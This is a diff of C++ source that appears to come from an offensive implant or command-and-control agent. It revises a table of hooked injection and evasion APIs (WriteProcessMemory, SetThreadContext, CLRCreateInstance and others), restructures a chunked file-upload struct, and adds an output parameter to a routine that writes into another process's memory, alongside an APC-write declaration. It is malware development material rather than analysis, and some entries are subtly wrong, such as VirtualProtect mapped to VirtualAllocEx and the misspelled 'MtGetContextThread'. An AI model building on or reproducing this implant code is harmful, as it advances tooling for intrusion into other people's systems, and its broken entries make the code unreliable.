@@ -1160,21 +1160,21 @@ public:
         UPTR Hash;
         UPTR Ptr;
     } HookTable[15] = {
-        HookTable[0]  = { Hsh::Str( "VirtualAlloc" ),       (UPTR)&Self->Cf->VirtualAlloc },
-        HookTable[1]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)&Self->Cf->VirtualAllocEx },
-        HookTable[2]  = { Hsh::Str( "WriteProcessMemory" ), (UPTR)&Self->Cf->WriteProcessMemory },
-        HookTable[3]  = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)&Self->Cf->ReadProcessMemory },
-        HookTable[4]  = { Hsh::Str( "LoadLibraryA" ),       (UPTR)&Self->Cf->LoadLibraryA },
-        HookTable[5]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)&Self->Cf->VirtualProtect },
-        HookTable[6]  = { Hsh::Str( "VirtualAllocEx" ),     (UPTR)&Self->Cf->VirtualAllocEx },
-        HookTable[7]  = { Hsh::Str( "VirtualProtectEx" ),   (UPTR)&Self->Cf->VirtualProtectEx },
-        HookTable[8]  = { Hsh::Str( "NtSetContextThread" ), (UPTR)&Self->Cf->SetThreadContext },
-        HookTable[9]  = { Hsh::Str( "SetThreadContext" ),   (UPTR)&Self->Cf->SetThreadContext },
-        HookTable[10] = { Hsh::Str( "MtGetContextThread" ), (UPTR)&Self->Cf->GetThreadContext },
-        HookTable[11] = { Hsh::Str( "GetThreadContext" ),   (UPTR)&Self->Cf->GetThreadContext },
-        HookTable[12] = { Hsh::Str( "CLRCreateInstance" ),  (UPTR)&Self->Cf->CLRCreateInstance },
-        HookTable[13] = { Hsh::Str( "CoInitialize" ),       (UPTR)&Self->Cf->CoInitialize },
-        HookTable[14] = { Hsh::Str( "CoInitializeEx" ),     (UPTR)&Self->Cf->CoInitializeEx },
+        HookTable[0]  = { Hsh::Str( "VirtualAlloc" ),       (UPTR)Self->Cf->VirtualAlloc },
+        HookTable[1]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)Self->Cf->VirtualAllocEx },
+        HookTable[2]  = { Hsh::Str( "WriteProcessMemory" ), (UPTR)Self->Cf->WriteProcessMemory },
+        HookTable[3]  = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)Self->Cf->ReadProcessMemory },
+        HookTable[4]  = { Hsh::Str( "LoadLibraryA" ),       (UPTR)Self->Cf->LoadLibraryA },
+        HookTable[5]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)Self->Cf->VirtualProtect },
+        HookTable[6]  = { Hsh::Str( "VirtualAllocEx" ),     (UPTR)Self->Cf->VirtualAllocEx },
+        HookTable[7]  = { Hsh::Str( "VirtualProtectEx" ),   (UPTR)Self->Cf->VirtualProtectEx },
+        HookTable[8]  = { Hsh::Str( "NtSetContextThread" ), (UPTR)Self->Cf->SetThreadContext },
+        HookTable[9]  = { Hsh::Str( "SetThreadContext" ),   (UPTR)Self->Cf->SetThreadContext },
+        HookTable[10] = { Hsh::Str( "MtGetContextThread" ), (UPTR)Self->Cf->GetThreadContext },
+        HookTable[11] = { Hsh::Str( "GetThreadContext" ),   (UPTR)Self->Cf->GetThreadContext },
+        HookTable[12] = { Hsh::Str( "CLRCreateInstance" ),  (UPTR)Self->Cf->CLRCreateInstance },
+        HookTable[13] = { Hsh::Str( "CoInitialize" ),       (UPTR)Self->Cf->CoInitialize },
+        HookTable[14] = { Hsh::Str( "CoInitializeEx" ),     (UPTR)Self->Cf->CoInitializeEx },
     };
 
     struct {
@@ -1831,22 +1831,18 @@ public:
 #endif // PROFILE_WEB
 
     struct {
-        struct {
-            PCHAR FileID;
-            ULONG ChunkSize;
-            ULONG CurChunk;
-            ULONG TotalChunks;
-            PCHAR Path;
-        } Up;
-        
-        struct {
+        CHAR* FileID;
+        ULONG ChunkSize;
+        ULONG CurChunk;
+        ULONG TotalChunks;
+        CHAR* Path;
+    } Up[5];
+    
+    struct {
 
-        } Down;
-    } Tf = {
-        .Up = {
-            .ChunkSize = KH_CHUNK_SIZE
-        }
-    };
+    } Down;
+
+    ULONG ChunckSize;
 
     struct {
         PVOID  Node;
@@ -2289,10 +2285,11 @@ public:
     ) -> BOOL;
 
     auto Write(
-        _In_ PVOID  Base,
-        _In_ BYTE*  Buffer,
-        _In_ ULONG  Size,
-        _In_ HANDLE Handle = NtCurrentProcess()
+        _In_  PVOID   Base,
+        _In_  BYTE*   Buffer,
+        _In_  ULONG   Size,
+        _Out_ SIZE_T* Written,
+        _In_  HANDLE Handle = NtCurrentProcess()
     ) -> BOOL;
 
     auto WriteAPC(
